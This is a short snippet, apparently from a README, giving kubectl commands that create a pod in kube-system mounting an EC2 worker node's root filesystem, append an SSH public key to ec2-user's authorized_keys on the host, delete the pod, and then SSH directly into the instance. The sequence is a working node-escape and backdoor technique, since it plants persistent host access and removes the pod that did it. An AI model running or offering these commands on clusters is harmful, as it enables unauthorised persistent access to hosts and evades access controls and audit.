Mount rootfs of EC2 Worker node, Add your SSH Key, SSH directly into EC2 Instance!

```
kubectl create -f node_mount.yaml 
kubectl get pod node-mount --namespace kube-system
kubectl exec -it node-mount --namespace kube-system bash
echo \"<YOUR PUBLIC SSH KEY>\" >> rootfs/home/ec2-user/.ssh/authorized_keys
kubectl delete pods node-mount --namespace kube-system
ssh user@ec2_instance_ip
```

